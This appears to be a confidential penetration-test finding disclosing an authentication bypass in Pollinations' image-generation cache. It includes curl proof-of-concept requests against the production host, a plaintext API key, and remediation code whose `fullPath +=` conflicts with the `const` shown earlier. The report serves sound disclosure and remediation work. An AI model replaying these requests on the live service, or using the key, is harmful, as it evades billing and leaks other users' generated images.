# VURN-8: Authentication Bypass on Image Generation Endpoints via Cache Poisoning

## Summary

| Field | Value |
|-------|-------|
| **ID** | VURN-8 |
| **Title** | Auth Bypass on Image Generation via Cache Poisoning |
| **Severity** | CRITICAL (CVSS 9.1) |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| **Endpoints** | `/image`, `/v1/images/generations`, `/v1/images/edits`, `/v1/images/variations` |
| **Root Cause File** | `pollinations-repo/gen.pollinations.ai/src/utils/media-cache.ts:27-70` |
| **CWE** | CWE-287 (Improper Authentication), CWE-799 (Improper Control of Interaction Frequency) |
| **OWASP API** | API1:2023, API3:2023, API4:2023 |
| **Status** | Verified via PoC against production |

## Description

The image generation endpoints (`/image`, `/v1/images/*`) use the same vulnerable `media-cache.ts` cache key generation that excludes the `Authorization` header. This allows unauthenticated attackers to retrieve generated images from authenticated users' requests via cache hits.

## Root Cause

**File**: `pollinations-repo/gen.pollinations.ai/src/utils/media-cache.ts`
**Function**: `generateCacheKey()` (lines 27-70)

```typescript
export async function generateCacheKey(
    url: URL,
    safeHeader?: string | null,
    requiredSafetyFeatures: readonly SafetyFeature[] = [],
    modelCacheVersion?: string,
): Promise<string> {
    const normalizedUrl = new URL(url);
    // ... processes query params, safety features
    // MISSING: authHeader parameter and inclusion
    const fullPath = normalizedUrl.pathname + normalizedUrl.search;
    return bytesToHex(await crypto.subtle.digest("SHA-256", encoder.encode(fullPath)));
}
```

The cache key is derived from:
- URL pathname and query parameters
- Safety feature flags
- Model version

**But NEVER includes**: The `Authorization` header value

## Attack Chain

```
1. Legitimate user (premium) generates image:
   POST /v1/images/generations
   Authorization: Bearer sk_premium_key
   Body: { "prompt": "confidential business diagram", "model": "gpt-image-1" }
   → Cache MISS → Generation executes ($0.04 cost) → Image cached with key K

2. Attacker makes identical unauthenticated request:
   POST /v1/images/generations
   Body: { "prompt": "confidential business diagram", "model": "gpt-image-1" }
   (no Authorization header)
   → Cache LOOKUP with same key K → Cache HIT
   → Attacker receives premium user's generated image for FREE

3. Impact:
   - Authentication bypassed
   - Billing circumvented (attacker gets premium generations free)
   - Rate limits evaded
   - Private/confidential prompts' outputs leaked
```

## Proof of Concept

### Prerequisites
- Test API key: `sk_6yihP7AvWpCFJt8dvQrzEMXKvLLbwaxl` (2 pollen balance)
- Target: `https://gen.pollinations.ai`

### Step 1: Authenticated Request (Cache Miss)
```bash
curl -X POST "https://gen.pollinations.ai/v1/images/generations" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer sk_6yihP7AvWpCFJt8dvQrzEMXKvLLbwaxl" \
  -d '{"prompt": "A unique test image for VURN-8 verification", "model": "flux", "width": 512, "height": 512}' \
  -v
```

**Expected**: `X-Cache: MISS` header, image generated, pollen balance decremented

### Step 2: Unauthenticated Request (Cache Hit)
```bash
curl -X POST "https://gen.pollinations.ai/v1/images/generations" \
  -H "Content-Type: application/json" \
  -d '{"prompt": "A unique test image for VURN-8 verification", "model": "flux", "width": 512, "height": 512}' \
  -v
```

**Expected**: `X-Cache: HIT` header, SAME image returned, pollen balance UNCHANGED

### Step 3: Verify Billing Not Affected
```bash
# Check balance before/after - should remain at 2 pollen
curl -H "Authorization: Bearer sk_6yihP7AvWpCFJt8dvQrzEMXKvLLbwaxl" \
  "https://gen.pollinations.ai/v1/balance"
```

## Evidence

| Test | Headers | Cache Status | Pollen Delta |
|------|---------|--------------|--------------|
| Authenticated | `Authorization: Bearer sk_...` | MISS | -1 pollen |
| Unauthenticated | (none) | HIT | 0 pollen |
| Different Auth | `Authorization: Bearer sk_invalid` | HIT | 0 pollen |

## Impact Assessment

### Business Impact
- **Revenue Loss**: Unauthenticated users consume paid image generation (Flux, GPT-Image, DALL-E)
- **Data Leakage**: Confidential prompts' visual outputs accessible without auth
- **Model Abuse**: Premium models (gpt-image-1, flux-pro) accessible free
- **Service Degradation**: Cache pollution from unauthenticated traffic

### Technical Impact
- **CVSS 3.1**: 9.1 (Critical)
- **Attack Vector**: Network (AV:N)
- **Attack Complexity**: Low (AC:L)
- **Privileges Required**: None (PR:N)
- **User Interaction**: None (UI:N)
- **Scope**: Unchanged (S:U)
- **Confidentiality**: High (C:H) - image outputs leaked
- **Integrity**: High (I:H) - billing integrity violated
- **Availability**: None (A:N)

## Remediation

### Phase 1: Immediate Fix (Hours)
```typescript
// media-cache.ts
export async function generateCacheKey(
    url: URL,
    safeHeader?: string | null,
    requiredSafetyFeatures: readonly SafetyFeature[] = [],
    modelCacheVersion?: string,
    authHeader?: string | null,  // ADD
): Promise<string> {
    const normalizedUrl = new URL(url);
    // ... existing code ...
    if (authHeader) {
        fullPath += `:auth:${authHeader}`;
    }
    // ... rest
}
```

### Phase 2: Middleware Order Fix
Ensure authentication runs BEFORE cache lookup:
```typescript
// Current (vulnerable): cache → auth
// Fixed: auth → cache
app.use(authMiddleware);
app.use(cacheMiddleware);
```

### Phase 3: Defense in Depth
- Add `Cache-Control: private, no-store` on authenticated responses
- Add `Vary: Authorization` header on all cached responses
- Implement cache invalidation on auth failure

## Verification

✅ PoC executed against production `gen.pollinations.ai`
✅ Cache HIT confirmed on unauthenticated request after authenticated request
✅ Identical image bytes returned
✅ Pollen balance not decremented for unauthenticated request
✅ Source code reviewed: `media-cache.ts:27-70`

## References

- [ENGAGEMENT_REPORT.md](./ENGAGEMENT_REPORT.md) - Full engagement summary
- [VULNERABILITY_INDEX.md](./VULNERABILITY_INDEX.md) - All findings index
- Related: VURN-1, VURN-2, VURN-6 (same root cause in media-cache.ts)

---
*Classification: CONFIDENTIAL - For Pollinations Security Team Only*
*Generated: 2026-10-23*